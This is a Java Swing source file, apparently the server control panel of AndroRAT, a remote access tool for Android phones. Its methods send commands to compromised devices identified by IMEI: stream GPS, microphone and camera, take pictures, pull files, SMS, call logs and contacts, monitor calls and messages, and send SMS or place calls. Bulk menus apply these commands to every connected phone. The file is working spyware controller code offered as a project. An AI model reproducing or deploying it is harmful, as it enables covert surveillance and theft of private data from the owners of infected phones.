package gui;

import inout.Protocol;

import java.awt.Color;
import java.awt.Component;
import java.awt.Image;
import java.awt.Toolkit;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JLabel;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JScrollPane; 
import javax.swing.JTable;
import javax.swing.KeyStroke;
import javax.swing.ListSelectionModel;
import javax.swing.UIManager;

import Packet.AdvancedInformationPacket;
import Packet.CallPacket;
import Packet.PreferencePacket;
import Packet.SMSPacket;

import server.Server;
import utils.Contact;
import utils.EncoderHelper;
import utils.MyFile;
import javax.swing.GroupLayout.Alignment;
import javax.swing.GroupLayout;
import javax.swing.JSplitPane;
import gui.panel.ColorPane;
import javax.swing.JCheckBoxMenuItem;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.TableCellEditor;

import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.Dimension;
import java.awt.Font;

public class GUI extends javax.swing.JFrame {
	
	private JMenuItem buttonRemoveUser;
	private JMenuItem buttonUserGUI;
    private JMenuItem buttonExit;
    private JMenuItem buttonAbout;
    private JMenu jMenu1;
    private JMenu jMenu2;
    private JMenuBar jMenuBar1;
    private JScrollPane jScrollPane1;
    private JScrollPane jScrollPane;
    private JTable userTable;
    private JSplitPane splitPane;

    private UserModel model;
    private HashMap<String, UserGUI> guiMap;
    
    private ColorPane logPanel;
    private Server server;
    private JCheckBoxMenuItem chckbxmntmShowLogs;
    private JMenu mnAbout;
    private JMenu mnBulkActions;
    private JMenuItem mntmToastit;
    private JMenuItem mntmSendSms;
    private JMenuItem mntmGiveCall;
    private JMenuItem mntmPort;

    public GUI(Server server, int port) {
    	
    	this.server = server;
    	guiMap = new HashMap<String, UserGUI>();

        initComponents();

        model = new UserModel();
        userTable.setModel(model);
        userTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        userTable.getColumnModel().getColumn(0).setCellRenderer(new MyRenderer());
        logPanel.append(Color.blue, "*** ANDRORAT SERVEUR ***\n" +
        		"Authors : A.Bertrand, A.Akimov, R.David, P.Junk\nLaunch at " +
        		(new Date(System.currentTimeMillis()))+"\n" + 
        		"On port : "+ port +"\n");
        
        centrerTable(userTable);
        
        this.setLocationRelativeTo(null);
        this.setTitle("Androrat Project");
        this.setVisible(true);
    }
    
    
    // *******************************
    //	M�thodes du log gui
    // *******************************
    
    public void logErrTxt(String txt) {
    	logPanel.append(Color.red, (new Date(System.currentTimeMillis())+ " "+txt+"\n"));
    }
    
    public void logTxt(String txt) {
    	logPanel.append(Color.black, (new Date(System.currentTimeMillis())+ " "+txt+"\n"));
    }
    
    public void clientLogTxt(String imei, long date, String txt) {
    	guiMap.get(imei).logTxt(date, txt);
    	//logPanel.append(Color.gray, "Client ("+imei+") at "+(new Date(date))+" : "+txt+"\n");
    }
    
    public void clientErrLogTxt(String imei, long date, String txt) {
    	guiMap.get(imei).errLogTxt(date, txt);
    	//logPanel.append(Color.red, "Client ("+imei+") at "+(new Date(date))+" : "+txt+"\n");
    }
    

    
    // *******************************
    //	M�thodes des boutons du menu
    // *******************************
    
    private void buttonStartActionPerformed() {
    	try {
	    	for(int row = 0; row < userTable.getRowCount(); row++) {
	    		String imei = (String) model.getValueAt(row, 0);
	    		if(imei != null) server.commandSender(imei, Protocol.DISCONNECT, null);
	    	}
    	} catch(Exception e) {
    		//
    	} finally {
    		this.dispose();
    	}
    }
    
    private void buttonUserGUIActionPerformed() {
    	int row = userTable.getSelectedRow();
        if(row != -1) {
        	String imei = (String) model.getValueAt(row, 1);
        	
        	if(imei != null) {
	        	UserGUI gui = guiMap.get(imei);
	        	if(gui == null) {
	        		gui = new UserGUI(imei, this);
	        		guiMap.put(imei, gui);
	        	} else {
	        		gui.setVisible(true);
	        	}
        	}
        	
        } else {
        	JOptionPane.showMessageDialog(this,"No client selected !\nPlease select one client.","No selection",JOptionPane.ERROR_MESSAGE);
        }
    }

    private void buttonRemoveUserActionPerformed() {
        int row = userTable.getSelectedRow();
        if(row != -1) {
        	String imei = (String) model.getValueAt(row, 1);
        	if(imei != null) {
	        	server.commandSender(imei, Protocol.DISCONNECT, null);
	        	this.deleteUser(imei);
        	}
        } else {
        	JOptionPane.showMessageDialog(this,"No client selected !\nPlease select one client.","No selection",JOptionPane.ERROR_MESSAGE);
        }
    }
    
    private void buttonAboutActionPerformed() {
    	JOptionPane.showMessageDialog(this,"Androrat is a free application developped in Java language.\n" +
    			"Autors : A.Bertrand, R.David, A.Akimov & P.Junk\n" +
    			"It is under the GNU GPL3 Licence","About Androrat",JOptionPane.INFORMATION_MESSAGE,
    			new ImageIcon(this.getIconImage()));
    }
    
    private void buttonShowLogs() {
    	if(chckbxmntmShowLogs.isSelected()) {
    		logPanel.setVisible(true);
    		jScrollPane.setVisible(true);
    		splitPane.setDividerLocation(0.5);
    	} else {
    		logPanel.setVisible(false);
    		jScrollPane.setVisible(false);
    		splitPane.setDividerLocation(1);
    	}
    }

    
    // *******************************
    //	M�thodes de modif du tableau
    // *******************************

    /**
     * Ajoute une ligne "client" dans le tableau des clients connectés
     * @param imei L'identifiant t�l�phone
     * @param countryCode Le code du pays o� se trouve l'appareil
     * @param telNumber Le numero de t�l�phone (si disponible) de l'appareil
     * @param simCountryCode Le pays d'enregitrement de la SIM
     * @param simSerial Le s�rial de la SIM
     * @param operator L'op�rateur o� se trouve l'appareil
     * @param simOperator L'op�rateur de la carte SIM
     */
    /*
    public void addUser(String imei, String countryCode, String telNumber, String simCountryCode, String simSerial, String operator, String simOperator) {
        if(countryCode == null) countryCode = "/";
        if(telNumber == null) telNumber = "/";
        if(simCountryCode == null) simCountryCode = "/";
        if(simOperator == null) simOperator = "/";
        if(simSerial == null) simSerial = "/";
        if(operator == null) operator = "/";
        model.addUser(new User(imei, countryCode, telNumber, operator, simCountryCode, simOperator, simSerial));
    }*/
    
    public void addUser(String imei, String countryCode, String telNumber, String simCountryCode, String simSerial, String operator, String simOperator) {
    	
    	if(countryCode == null) countryCode = "/";
        if(telNumber == null) telNumber = "/";
        if(simCountryCode == null) simCountryCode = "/";
        if(simOperator == null) simOperator = "/";
        if(simSerial == null) simSerial = "/";
        if(operator == null) operator = "/";
        
        model.addUser(new User(countryCode,imei, countryCode, telNumber, operator, simCountryCode, simOperator, simSerial));
    }
    
	public class MyRenderer extends DefaultTableCellRenderer
	{

		public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column)
		{
			String country = (String) value;
			ImageIcon getImg;
			//country = "fr";
			File f = new File("src/gui/res/Drapeau/" + country.toUpperCase() + ".png");
			if (f.exists())
			{
				getImg = new ImageIcon(Toolkit.getDefaultToolkit().getImage(
				UserGUI.class.getResource("/gui/res/Drapeau/" + country.toUpperCase() + ".png")));
			} else
			getImg = new ImageIcon(Toolkit.getDefaultToolkit().getImage(UserGUI.class.getResource("/gui/res/Drapeau/default.jpeg")));

			Image img = getImg.getImage();
			Image newimg = img.getScaledInstance(64, 64, java.awt.Image.SCALE_SMOOTH);
			ImageIcon imgResize = new ImageIcon(newimg);
			setIcon(imgResize);
			return this;
		}
	}
    //-------------------------------------------------

    /**
     * Enl�ve de la table des clients, le client mis en param�tre
     * @param imei L'identifiant du client � supprimer
     */
    public void deleteUser(String imei) {
        model.removeUser(imei);
        UserGUI gui = guiMap.get(imei);
        if(gui != null) {
	        if(gui.isVisible()) gui.launchMessageDialog("This client is no longer available.\nClosing frame now ...", "Disconnection", JOptionPane.ERROR_MESSAGE);
	        gui.dispose();
        }
        guiMap.remove(imei);
        getContentPane().repaint();
    }
    
    /**
     * M�thode appel�e par les UserGUI lors de leur fermeture afin de supprimer la r�f�rence dans la HashMap
     * @param imei L'identifiant de la fenetre
     */
    public void closeUserGUI(String imei) {
    	guiMap.remove(imei);
    }
    
    
    // *******************************
    //	M�thodes de modif des userGUI
    // *******************************
    
    public void updateAdvInformations(String imei, AdvancedInformationPacket packet) {
    	UserGUI user = guiMap.get(imei);
    	user.updateHomeInformations(packet);
    }
    
    public void updatePreference(String imei, String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw) {
    	UserGUI user = guiMap.get(imei);
    	user.updatePreference(ip, port, wait, phones, sms, kw);
    }
    
    public void updateUserMap(String imei, double lon, double lat, double alt, float speed, float accuracy) {
    	UserGUI user = guiMap.get(imei);
    	user.updateMap(lon, lat, alt, speed, accuracy);
    }
    
    public void updateUserPicture(String imei, byte[] picture) {
    	UserGUI user = guiMap.get(imei);
    	user.updatePicture(picture);
    }
    
    public void addSoungBytes(String imei, byte[] data) {
    	UserGUI user = guiMap.get(imei);
    	user.addSoundBytes(data);
    }
    
    public void addVideoBytes(String imei, byte[] data) {
    	UserGUI user = guiMap.get(imei);
    	user.addVideoBytes(data);
    }
    
    public void updateFileTree(String imei, ArrayList<MyFile> fileList) {
    	UserGUI user = guiMap.get(imei);
    	user.updateFileTree(fileList);
    }
    
    public void updateUserCallLogs(String imei, ArrayList<CallPacket> logsList) {
    	UserGUI user = guiMap.get(imei);
    	user.updateCallLogs(logsList);
    }
    
    public void updateContacts(String imei, ArrayList<Contact> contacts) {
    	UserGUI user = guiMap.get(imei);
    	user.updateContacts(contacts);
    }
    
    public void addMonitoredCall(String imei, int type, String phoneNumber) {
    	UserGUI user = guiMap.get(imei);
    	user.addMonitoredCall(type, phoneNumber);
    }
    
    public void addMonitoredSMS(String imei, String addr, long date, String body) {
    	UserGUI user = guiMap.get(imei);
    	user.addMonitoredSMS(addr, date, body);
    }
    
    public void updateSMS(String imei, ArrayList<SMSPacket> sms) {
    	UserGUI user = guiMap.get(imei);
    	user.updateSMS(sms);
    }
    
    
    // *******************************
    //	M�thodes pour save le channel
    // *******************************
    
    
    public void saveMapChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveMapChannel(channel);
    }
    
    public void saveCallLogChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveCallLogChannel(channel);
    }
    
    public void saveContactChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveContactChannel(channel);
    }
    
    public void saveMonitorSMSChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveMonitorSMSChannel(channel);
    }
    
    public void saveMonitorCallChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveMonitorCallChannel(channel);
    }
    
    public void savePictureChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.savePictureChannel(channel);
    }
    
    public void saveSoundChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveSoundChannel(channel);
    }
    
    public void saveVideoChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveVideoChannel(channel);
    }
    
    public void saveSMSChannel(String imei, int channel) {
    	// TODO
    }
    
    
    // *******************************
    //	M�thodes pour les UserGUI
    // *******************************
    
    public void fireGetAdvInformations(String imei) {
    	server.commandSender(imei, Protocol.GET_ADV_INFORMATIONS, null);
    	server.commandSender(imei, Protocol.GET_PREFERENCE, null);
    }
    
    public void fireGetSMS(String imei, String req) {
    	server.commandSender(imei, Protocol.GET_SMS, req.getBytes());
    }
    
    public void fireStartGPSStreaming(String imei, String provider) {
    	server.commandSender(imei, Protocol.GET_GPS_STREAM, provider.getBytes());
    }
    
    public void fireStopGPSStreaming(String imei, int channel) {
    	server.commandStopSender(imei, Protocol.STOP_GPS_STREAM, null, channel);
    }
    
    public void fireStartSoundStreaming(String imei, int source) {
    	byte[] byteSource = ByteBuffer.allocate(4).putInt(source).array();
    	server.commandSender(imei, Protocol.GET_SOUND_STREAM, byteSource);
    }
    
    public void fireStopSoundStreaming(String imei, int channel) {
    	server.commandStopSender(imei, Protocol.STOP_SOUND_STREAM, null, channel);
    }
    
    public void fireStartVideoStream(String imei) {
    	server.commandSender(imei, Protocol.GET_VIDEO_STREAM, null);
    }
    
    public void fireStopVideoStream(String imei, int channel) {
    	server.commandStopSender(imei, Protocol.STOP_VIDEO_STREAM, null, channel);
    }
    
    public void fireTakePicture(String imei) {
    	server.commandSender(imei, Protocol.GET_PICTURE, null);
    }
    
    public void fireFileDownload(String imei, String path, String downPath, String downName) {
    	server.commandFileSender(imei, Protocol.GET_FILE, path.getBytes(), downPath, downName);
    }
    
    public void fireTreeFile(String imei) {
    	server.commandSender(imei, Protocol.LIST_DIR, "/".getBytes());
    }
    
    public void fireToastMessage(String imei, String txt) {
    	server.commandSender(imei, Protocol.DO_TOAST, txt.getBytes());
    }
    
    public void fireVibrate(String imei, Long duration) {
    	server.commandSender(imei, Protocol.DO_VIBRATE, EncoderHelper.encodeLong(duration));
    }
    
    public void fireBrowseUrl(String imei, String url) {
    	server.commandSender(imei, Protocol.OPEN_BROWSER, url.getBytes());
    }
    
    public void fireSendSMS(String imei, HashMap<String, String> map) {
    	byte[] data = EncoderHelper.encodeHashMap(map);
    	server.commandSender(imei, Protocol.SEND_SMS, data);
    }
    
    public void fireGiveCall(String imei, String target) {
    	server.commandSender(imei, Protocol.GIVE_CALL, target.getBytes());
    }
    
    public void fireCallLogs(String imei, String request) {
    	server.commandSender(imei, Protocol.GET_CALL_LOGS, request.getBytes());
    }
    
    public void fireContacts(String imei) {
    	server.commandSender(imei, Protocol.GET_CONTACTS, null);
    }
    
    public void fireStartCallMonitoring(String imei, HashSet<String> phoneNumbers) {
    	server.commandSender(imei, Protocol.MONITOR_CALL, EncoderHelper.encodeHashSet(phoneNumbers));
    }
    
    public void fireStopCallMonitoring(String imei, int channel) {
    	server.commandStopSender(imei, Protocol.STOP_MONITOR_CALL, null, channel);
    }
    
    public void fireStartSMSMonitoring(String imei, HashSet<String> phoneNumbers) {
    	server.commandSender(imei, Protocol.MONITOR_SMS, EncoderHelper.encodeHashSet(phoneNumbers));
    }
    
    public void fireStopSMSMonitoring(String imei, int channel) {
    	server.commandStopSender(imei, Protocol.STOP_MONITOR_SMS, null, channel);
    }
    
    public void fireSaveConnectConfiguration(String imei, String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw) {
    	PreferencePacket pp = new PreferencePacket(ip, port, wait, phones, sms, kw);
    	server.commandSender(imei, Protocol.SET_PREFERENCE, pp.build());
    }
    
    
    
    
    private void fireBulkToast() {
    	String txt = JOptionPane.showInputDialog(this, "Enter your text :");
    	if(txt != null) {
    		for(int row = 0; row < userTable.getRowCount(); row++) {
    			String imei = (String) model.getValueAt(row, 1);
    			if(imei != null) this.fireToastMessage(imei, txt);
    		}
    	}
    }
    
    private void fireBulkSMS() {
    	SMSDialog dialog = new SMSDialog(this);
		String[] res = dialog.showDialog();
		if(res != null) {
			HashMap<String, String> map = new HashMap<String, String>();
			map.put(Protocol.KEY_SEND_SMS_NUMBER, res[0]);
			map.put(Protocol.KEY_SEND_SMS_BODY, res[1]);
			
			for(int row = 0; row < userTable.getRowCount(); row++) {
    			String imei = (String) model.getValueAt(row, 1);
    			if(imei != null) this.fireSendSMS(imei, map);
    		}
		}
    }
    
    private void fireBulkCall() {
    	String target = JOptionPane.showInputDialog(this, "Enter the target cell number :");
    	if(target != null) {
    		for(int row = 0; row < userTable.getRowCount(); row++) {
    			String imei = (String) model.getValueAt(row, 1);
    			if(imei != null) this.fireToastMessage(imei, target);
    		}
    	}
    }
    
    private void fireSelectPort() {
    	String rep = JOptionPane.showInputDialog(this, "Enter the new server port (need server reboot) : ");
    	server.savePortConfig(rep);
    }
    
    private void userMouseClicked(MouseEvent e) {
    	if(e.getClickCount() == 2) {
	    	this.buttonUserGUIActionPerformed();
    	}
    }
    
    
    /**
     * Fonction g�n�rant les �l�ments SWING de l'interface graphique
     * NE PAS TOUCHER !!
     */
    private void initComponents() {
    	
    	try {
    		UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(GUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(GUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(GUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(GUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }

    	BufferedImage image = null;
        try {
            image = ImageIO.read(
                this.getClass().getResource("/gui/res/androrat_logo_32pix.png"));
        } catch (IOException e) {
            e.printStackTrace();
        }
        this.setIconImage(image);
        jMenuBar1 = new javax.swing.JMenuBar();
        jMenu1 = new javax.swing.JMenu();
        buttonExit = new javax.swing.JMenuItem();
        jMenu2 = new javax.swing.JMenu();
        buttonRemoveUser = new javax.swing.JMenuItem();
        buttonUserGUI = new javax.swing.JMenuItem();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        jMenu1.setText("Server");

        buttonExit.setText("Exit application");
        buttonExit.addActionListener(new java.awt.event.ActionListener() {
            @Override
			public void actionPerformed(java.awt.event.ActionEvent evt) {
                buttonStartActionPerformed();
            }
        });
        jMenu1.add(buttonExit);
        
        chckbxmntmShowLogs = new JCheckBoxMenuItem("Show logs");
        chckbxmntmShowLogs.addActionListener(new ActionListener() {
        	@Override
			public void actionPerformed(ActionEvent e) {
        		buttonShowLogs();
        	}
        });
        
        mntmPort = new JMenuItem("Select port");
        mntmPort.addActionListener(new ActionListener() {
        	public void actionPerformed(ActionEvent e) {
        		fireSelectPort();
        	}
        });
        jMenu1.add(mntmPort);
        chckbxmntmShowLogs.setSelected(true);
        jMenu1.add(chckbxmntmShowLogs);

        jMenuBar1.add(jMenu1);

        jMenu2.setText("Client actions");
        
        buttonUserGUI.setText("Open user interface");
        buttonUserGUI.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_U, InputEvent.CTRL_MASK));
        buttonUserGUI.addActionListener(new java.awt.event.ActionListener() {
            @Override
			public void actionPerformed(java.awt.event.ActionEvent evt) {
                buttonUserGUIActionPerformed();
            }
        });
        jMenu2.add(buttonUserGUI);

        buttonRemoveUser.setText("Disconnect user");
        buttonRemoveUser.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_R, InputEvent.CTRL_MASK));
        buttonRemoveUser.addActionListener(new java.awt.event.ActionListener() {
            @Override
			public void actionPerformed(java.awt.event.ActionEvent evt) {
                buttonRemoveUserActionPerformed();
            }
        });
        jMenu2.add(buttonRemoveUser);

        jMenuBar1.add(jMenu2);

        setJMenuBar(jMenuBar1);
        
        mnBulkActions = new JMenu("Bulk actions");
        jMenuBar1.add(mnBulkActions);
        
        mntmToastit = new JMenuItem("Toast-it");
        mntmToastit.addActionListener(new ActionListener() {
        	@Override
			public void actionPerformed(ActionEvent e) {
        		fireBulkToast();
        	}
        });
        mnBulkActions.add(mntmToastit);
        
        mntmSendSms = new JMenuItem("Send SMS");
        mntmSendSms.addActionListener(new ActionListener() {
        	@Override
			public void actionPerformed(ActionEvent e) {
        		fireBulkSMS();
        	}
        });
        mnBulkActions.add(mntmSendSms);
        
        mntmGiveCall = new JMenuItem("Give call");
        mntmGiveCall.addActionListener(new ActionListener() {
        	@Override
			public void actionPerformed(ActionEvent e) {
        		fireBulkCall();
        	}
        });
        mnBulkActions.add(mntmGiveCall);
        
        mnAbout = new JMenu("About");
        jMenuBar1.add(mnAbout);
        buttonAbout = new javax.swing.JMenuItem();
        mnAbout.add(buttonAbout);
        
        buttonAbout.setText("About Androrat");
        buttonAbout.addActionListener(new java.awt.event.ActionListener() {
            @Override
			public void actionPerformed(java.awt.event.ActionEvent evt) {
                buttonAboutActionPerformed();
            }
        });
        
        splitPane = new JSplitPane();
        splitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        layout.setHorizontalGroup(
        	layout.createParallelGroup(Alignment.LEADING)
        		.addComponent(splitPane, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 671, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
        	layout.createParallelGroup(Alignment.LEADING)
        		.addComponent(splitPane, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 305, Short.MAX_VALUE)
        );
        
        jScrollPane = new JScrollPane();
        splitPane.setRightComponent(jScrollPane);
        
        logPanel = new ColorPane();
        jScrollPane.setViewportView(logPanel);
        
        jScrollPane1 = new javax.swing.JScrollPane();
        splitPane.setLeftComponent(jScrollPane1);
        splitPane.setDividerLocation(200);
        userTable = new javax.swing.JTable();
        userTable.setRowMargin(3);
        userTable.setRowHeight(48);
        userTable.setFont(new Font("Dialog", Font.PLAIN, 14));
        userTable.setAutoResizeMode(JTable.AUTO_RESIZE_NEXT_COLUMN);
        userTable.addMouseListener(new MouseAdapter() {
        	@Override
        	public void mouseClicked(MouseEvent e) {
        		userMouseClicked(e);
        	}
        });
        jScrollPane1.setViewportView(userTable);
        getContentPane().setLayout(layout);
        
        pack();
    }
    
    private void centrerTable(JTable table) {     DefaultTableCellRenderer custom = new DefaultTableCellRenderer(); 
	    custom.setHorizontalAlignment(JLabel.CENTER);
	    userTable.getColumnModel().getColumn(0).setPreferredWidth(56);
	    for (int i=1 ; i<table.getColumnCount() ; i++) 
	    	table.getColumnModel().getColumn(i).setCellRenderer(custom); 
    }
}
